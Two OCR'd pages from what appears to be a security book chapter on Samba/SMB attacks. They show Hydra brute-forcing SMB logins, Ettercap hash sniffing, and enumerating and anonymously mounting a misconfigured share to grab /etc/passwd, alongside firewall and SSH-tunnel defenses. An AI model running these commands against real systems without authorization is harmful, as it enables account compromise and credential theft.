- pgno: 144
  md: '# Samba: 137 to 139 (TCP)


    Samba uses the SMB (Server Message Block) protocol to share files and printers
    over the network. SMB is most commonly used by Microsoft Windows operating systems.
    See http://www.samba.org/ for details on the Samba project.


    Brute-Forcing Since Samba authenticates using a username and password pair, it
    is possible to brute-force user accounts.


    # Brute-Force Samba


    Hydra can be used to brute-force SMB authentication:


    ```

    $bash hydra -L usernames.txt -P passwords.txt 10.0.0.1 smb

    Reduced number of tasks to 1 (smb does not like parallel connections)

    Hydra v2.2 (c) 2002) by von Hauser / THC - use only for legal purposes.

    Hydra is starting! [parallel tasks: 1, login tries: 2 (1:2/p:1)]

    [139]smb login: joe password:5h4k33sound

    Hydra finished.

    ```


    # Prevent Samba Brute-Forcing


    Please see “Common Defenses Against Brute-Force Attacks."


    Sniffing It is possible to sniff password hashes transmitted over the network
    during Samba authentication. Once the hashes are captured, they must be brute-force
    cracked in order to obtain the real password.


    # Obtain Samba Password Hashes


    Etcap can be used to capture Samba hashes sent over the network during authentication.
    For example, here is how you would run Ettercap to collect SMB password hashes
    being transmitted over the network:


    ```

    ettercap -C -N -m

    ```


    Password crackers such as John the Ripper, available at http://www.openwall.com/john/,
    can be used to crack the obtained hashes.


    # Tunnel Samba Traffic Securely


    Please see “Block and Tunnel Samba Traffic."'
  merge: -1
  img_proc: true
- pgno: 145
  md: '# Chapter 4: Remote Hacking


    Samba Misconfigurations Samba is often misconfigured to share file systems with
    critical data. Remote users can exploit such a vulnerability obtain sensitive
    system files located on the victim hosts.


    # Enumerate and Mount Remote Shares


    Use Samba''s smbclient command to look up what file shares are being exported
    by the remote server:


    ```

    bash]$ smbclient -L smserver -I 192.168.1.10 -U ''''

    added interface ip=192.168.1.1 bcast=192.168.1.255 nmask=255.255.255.255

    Password:[enter]

    Domain=[SOMECOMPANY] OS=[Unix] Server=[Samba 2.2.7]}

    ```


    | Sharename | Type | Comment |

    | --- | --- | --- |

    | IPC$ | IPC | IPC Service (.) |

    | ADMIN$ | Disk | IPC Service (.) |

    | etc | Disk | configfiles |


    | Server | Comment |

    | --- | --- |

    | SMBSERVER | SomeCompanyAsExample |

    | SAMBASERVER | |


    | Workgroup | Master |

    | --- | --- |

    | SOMECOMPANY | WMASTER |


    Now, since the preceding server has obviously been misconfigured to serve the
    /etc directory to the world, it can be mounted with the following mount command:


    ```

    mount -t smbfs -o username='''' /192.168.1.10/etc /mnt/smbshare

    ```


    After the /etc share, an intruder may grab the /etc/passwd file, which will be
    available on his or her host as /mnt/smbshare/passwd.


    # Block and Tunnel Samba Traffic


    If running Samba, please consider the following suggestions:


    +   - Configure your firewall to block Samba traffic.

    - Consider using SSH to tunnel Samba traffic:


    ```

    ssh username@remotesmbserver.somecompanyasanexample.com

    -L139:127.0.0.1:139

    ```'
